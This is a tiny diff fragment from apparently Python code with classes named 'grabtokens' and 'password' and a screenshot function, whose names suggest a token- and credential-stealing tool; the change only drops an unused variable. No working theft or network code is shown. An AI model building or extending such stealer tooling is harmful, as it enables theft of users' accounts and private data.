@@ -300,7 +300,7 @@ class grabtokens():
         token = self.tokens[0]
 
 def ss():
-    ss = screenshot('screenshot.png')
+    screenshot('screenshot.png')
 
 class password():
     def __init__(self):
